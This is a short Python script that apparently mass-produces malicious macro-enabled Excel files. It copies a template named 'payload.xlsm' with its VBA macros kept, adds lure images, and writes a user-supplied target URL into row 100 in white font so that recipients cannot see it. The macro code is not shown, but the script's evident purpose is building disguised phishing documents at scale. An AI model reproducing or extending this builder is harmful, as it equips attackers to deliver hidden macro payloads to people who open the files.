#!/usr/bin/env python
from argparse import ArgumentParser
from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from openpyxl import load_workbook
from openpyxl.drawing.image import Image
from openpyxl.styles import colors
from openpyxl.styles import Font, Color

parser = ArgumentParser()
parser.add_argument("-u", dest="url", help="Target URL")
parser.add_argument("-n", dest="numbers", help="How many XLSM to create?")
args = parser.parse_args()

url = args.url
numbers = args.numbers
img = Image('1.png')
img1 = Image('2.png')

print url
print numbers

i=1

while i <= int(numbers):
	wb = load_workbook(filename='payload.xlsm', read_only=False, keep_vba=True)
	dest_filename = 'listok ('+ str(i) +').xlsm'
	ws = wb.active
	ws.add_image(img, 'D1')
	ws.add_image(img1, 'A1')
	ws.cell(row=100, column=1, value = str(i))
	ws.cell(row=100, column=2, value = url)
	a1 = ws['B100']
	a2 = ws['A100']
	ft = Font(color=colors.WHITE)
	a1.font = ft
	a2.font = ft
	wb.save(filename = dest_filename)
	i = i+1